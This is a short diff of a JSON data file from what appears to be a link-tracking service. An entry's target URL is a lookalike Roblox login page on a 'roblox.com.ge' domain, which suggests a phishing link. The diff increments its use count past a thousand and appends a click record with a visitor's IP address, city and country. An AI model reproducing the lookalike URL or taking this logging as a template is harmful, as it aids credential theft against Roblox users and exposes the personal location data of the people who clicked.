@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1001,
+    "useCount": 1002,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8128,6 +8128,14 @@
         "city": "Tallinn",
         "flag": "🇪🇪",
         "countryCode": "EE"
+      },
+      {
+        "timestamp": 1777223027771,
+        "ip": "92.40.111.116",
+        "country": "United Kingdom",
+        "city": "Luton",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
